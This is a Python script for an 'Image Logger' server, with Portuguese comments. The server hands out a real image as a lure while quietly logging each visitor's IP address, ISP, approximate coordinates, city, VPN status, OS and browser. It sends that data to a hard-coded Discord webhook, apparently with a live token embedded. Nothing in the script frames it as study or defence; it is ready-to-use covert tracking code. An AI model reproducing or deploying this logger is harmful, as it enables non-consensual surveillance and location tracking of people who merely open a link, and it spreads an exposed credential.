from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import parse
import traceback, requests, base64, httpagentparser, json

config = {
    "webhook": "https://discord.com/api/webhooks/1529826199344250971/FhwVCzzEGAHh5a7RiLQC6-vseaAWJDQMiLPwml07pFwCoCKX8njGhfU9HDWc_hh6e57g",
    "image": "https://i.imgur.com/3i3UjfE.jpg",
    "username": "Image Logger",
    "color": 0xFF0000,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "IP Logged",
        "richMessage": False
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": False,
    "antiBot": 1,
    "redirect": {"redirect": False, "page": ""}
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    def handleRequest(self):
        try:
            ip = self.headers.get('x-forwarded-for', self.client_address[0])
            ua = self.headers.get('user-agent', 'Unknown')
            os, browser = httpagentparser.simple_detect(ua)
            
            # Pega info do IP via ip-api.com
            info = requests.get(f"http://ip-api.com/json/{ip}?fields=status,isp,as,country,regionName,city,lat,lon,timezone,mobile,proxy,hosting").json()
            
            # Monta o embed
            embed = {
                "username": config["username"],
                "embeds": [{
                    "title": "🎯 IP Capturado com Sucesso!",
                    "color": config["color"],
                    "description": (
                        f"**IP:** `{ip}`\n"
                        f"**ISP:** `{info.get('isp', 'Unknown')}`\n"
                        f"**ASN:** `{info.get('as', 'Unknown')}`\n"
                        f"**País:** `{info.get('country', 'Unknown')}`\n"
                        f"**Região:** `{info.get('regionName', 'Unknown')}`\n"
                        f"**Cidade:** `{info.get('city', 'Unknown')}`\n"
                        f"**Coords:** `{info.get('lat', '?')}, {info.get('lon', '?')}`\n"
                        f"**Fuso:** `{info.get('timezone', 'Unknown')}`\n"
                        f"**Mobile:** `{info.get('mobile', '?')}`\n"
                        f"**VPN/Proxy:** `{info.get('proxy', '?')}`\n"
                        f"**OS:** `{os}`\n"
                        f"**Browser:** `{browser}`\n"
                    ),
                    "thumbnail": {"url": config["image"]}
                }]
            }
            
            requests.post(config["webhook"], json=embed)
            print(f"[+] IP logado: {ip}")
            
            # Serve a imagem real
            img_data = requests.get(config["image"]).content
            self.send_response(200)
            self.send_header('Content-Type', 'image/jpeg')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(img_data)
            
        except Exception as e:
            print(f"[-] Erro: {e}")
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(b'OK')
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
